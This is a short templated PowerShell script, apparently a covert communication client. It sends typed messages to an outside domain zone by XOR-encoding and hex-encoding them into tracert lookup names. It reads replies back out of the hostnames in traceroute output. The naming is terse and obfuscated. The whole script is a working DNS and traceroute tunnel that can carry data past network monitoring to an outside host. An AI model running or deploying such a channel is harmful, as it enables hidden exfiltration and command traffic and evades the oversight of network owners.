$Z="{{DOMAIN_ZONE}}";$K=[byte[]]@({{KEY_CSV}})
function X($b){$o=New-Object byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){$o[$i]=$b[$i]-bxor$K[$i%4]};$o}
function E($s){-join(X([text.encoding]::UTF8.GetBytes($s))|%{$_.ToString('x2')})}
function D($h){if(!$h){return ""};$b=New-Object byte[]($h.Length/2);for($i=0;$i-lt$b.Length;$i++){$b[$i]=[convert]::ToByte($h.Substring($i*2,2),16)};$b=X $b;if($b.Length -ge 3 -and $b[0] -eq 0x1f -and $b[1] -eq 0x8b -and $b[2] -eq 8){$ms=[System.IO.MemoryStream]::new(,$b);$gs=[System.IO.Compression.GZipStream]::new($ms,[System.IO.Compression.CompressionMode]::Decompress);$ms2=[System.IO.MemoryStream]::new();$gs.CopyTo($ms2);$gs.Close();$b=$ms2.ToArray()};[text.encoding]::UTF8.GetString($b)}
for(){$M=Read-Host "you";if($M-eq"/quit"){tracert -h 1 -w 1000 "end.$Z"|Out-Null;break}
tracert -h 1 -w 1000 "$(E $M).tx.$Z" 2>&1|Out-Null;$R="";$tok=@(tracert -w 2000 "rx.$Z" 2>&1|%{($_ -split '\s+')|?{$_ -match '\.' -and $_ -match '\.[^.]+\.[^.]+\.'}});$R=($tok|%{if($_.StartsWith('end.')){break};($_ -split '\.'|?{$_.Length%2 -eq 0 -and $_ -match '^[0-9a-f]+$'})-join''})-join'';if($R){Write-Host "< $(D $R)"};Start-Sleep {{POLL_RATE}}}
